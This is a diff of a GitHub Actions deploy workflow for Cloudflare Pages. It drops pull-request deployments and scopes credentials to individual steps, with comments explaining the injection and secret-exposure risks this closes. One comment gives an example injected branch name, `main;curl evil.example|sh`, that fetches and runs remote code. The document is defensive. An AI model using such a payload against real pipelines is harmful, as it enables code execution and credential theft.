@@ -1,9 +1,25 @@
 name: Deploy
 
+# **No `pull_request` trigger, deliberately.** A workflow that deploys a pull request runs that
+# pull request's code with the Cloudflare credentials available to it — `npm run build` executes
+# `vite.config.ts` and every plugin it loads, from the branch being built. Scoping the token to
+# the steps that need it narrows that; it cannot remove it, because a pull request can edit this
+# file too. So branch write access would remain Cloudflare token access, and this repository
+# accepts pull requests.
+#
+# The alternative was protected GitHub Environments with required reviewers, which keeps previews
+# at the cost of a click per pull request. Previews were judged not worth that: the application
+# is a static bundle whose behaviour is covered by the browser tests in CI, and a reviewer who
+# wants one can dispatch this workflow by hand against any branch.
+#
+# What a pull request still gets is the *caching contract* check — `ci.yml` runs
+# `npm run check:deploy` independently, so a `_headers` that would pin the app shell is still
+# caught in review rather than after it ships.
 on:
   push:
     branches: [main]
-  pull_request:
+  # A maintainer can still deploy any branch by hand, which is what replaces PR previews. It
+  # requires write access, so the code being run is code somebody with write access chose.
   workflow_dispatch:
 
 concurrency:
@@ -11,12 +27,12 @@ concurrency:
   # cancelled it may itself be cancelled by the next one - so the last thing actually deployed
   # would be nobody's idea of the current state. Queueing costs a few minutes; the alternative
   # costs correctness.
-  group: deploy-${{ github.head_ref || github.ref }}
+  group: deploy-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
   contents: read
-  # For the GitHub Deployment the action records, so a PR shows where its preview went.
+  # For the GitHub Deployment the action records, so a hand-dispatched preview says where it went.
   deployments: write
 
 jobs:
@@ -24,29 +40,26 @@ jobs:
     name: Cloudflare Pages
     runs-on: blacksmith-2vcpu-ubuntu-2404
 
-    # A fork gets no deployment, for exactly the reason it gets no `npm ci`: GitHub does not
-    # give fork workflows access to secrets, and the fix for that is never
-    # `pull_request_target` - that runs untrusted code with the credentials, trading an
-    # inconvenience for a credential compromise. See CONTRIBUTING.md.
-    #
-    # Skipped by condition rather than left to fail, so that a red cross on a fork's PR means
-    # something is wrong rather than "as expected".
-    if: github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository
-
     env:
       # Read through the environment rather than interpolated straight into a `run:` block.
       # `${{ }}` substitution happens before the shell sees the script, so a branch name is
       # code at that point rather than data.
-      BRANCH: ${{ github.head_ref || github.ref_name }}
+      #
+      # `github.ref_name` rather than `github.head_ref || github.ref_name`: `head_ref` is set
+      # only for pull requests, and there are none here any more.
+      BRANCH: ${{ github.ref_name }}
 
       # The Cloudflare credentials are deliberately **not** here. They used to be, with a note
       # arguing that `npm ci --ignore-scripts` meant no untrusted code ran in this job — which
-      # is true of *dependency* code and not of this repository's own. `npm run build` executes
-      # `vite.config.ts` and every plugin it loads, from the branch being built, and this
-      # workflow runs on `pull_request` for same-repo branches. So a job-level token is a token
-      # readable by anything a contributor can put in a build config.
+      # is true of *dependency* code and not of this repository's own: `npm run build` executes
+      # `vite.config.ts` and every plugin it loads, from the branch being built.
       #
-      # They are now on the two steps that need them: the preflight check and the deploy. Both
+      # Dropping the `pull_request` trigger means that branch is now always one somebody with
+      # write access chose. This stays scoped anyway, because the two facts are independent: a
+      # token in the job environment is readable by every step whatever caused the run, and
+      # narrowing it costs nothing.
+      #
+      # They sit on the two steps that need them — the preflight check and the deploy — which
       # read the same expressions, so the check still guards the values the deploy uses.
 
     steps:
@@ -55,8 +68,8 @@ jobs:
       # Git permits a great deal in a ref name. It forbids spaces, `~`, `^`, `:`, `?`, `*`,
       # `[` and `\` — and permits `;`, `&`, `|`, `$`, `(`, `)` and backticks. So
       # `main;curl evil.example|sh` is a legal branch, and this workflow puts the branch name
-      # into a command that a shell will run. The job already refuses pull requests from
-      # forks, which means this is not reachable by a stranger; it is still one push away from
+      # into a command that a shell will run. This workflow only runs on a push to `main` or a
+      # hand dispatch, so it is not reachable by a stranger; it is still one push away from
       # anyone who can create a branch here, and "only our own contributors could exploit it"
       # is not a security property worth relying on.
       #
@@ -164,8 +177,9 @@ jobs:
           gitHubToken: ${{ secrets.GITHUB_TOKEN }}
           # `--branch` is what decides production from preview: a deployment whose branch is
           # the project's production branch (main) is production, anything else is a preview
-          # at <branch>.matter-manager.pages.dev. `github.head_ref` is set only for pull
-          # requests, so `BRANCH` reads as "the PR's branch, or whatever branch was pushed".
+          # at <branch>.matter-manager.pages.dev. A push to `main` is therefore production, and
+          # a hand dispatch against any other branch is a preview — which is what replaced
+          # deploying pull requests automatically.
           #
           # Substituted, not left for a shell to expand. This is an action *input*, and
           # whether the action runs it through a shell at all is the action's business, not
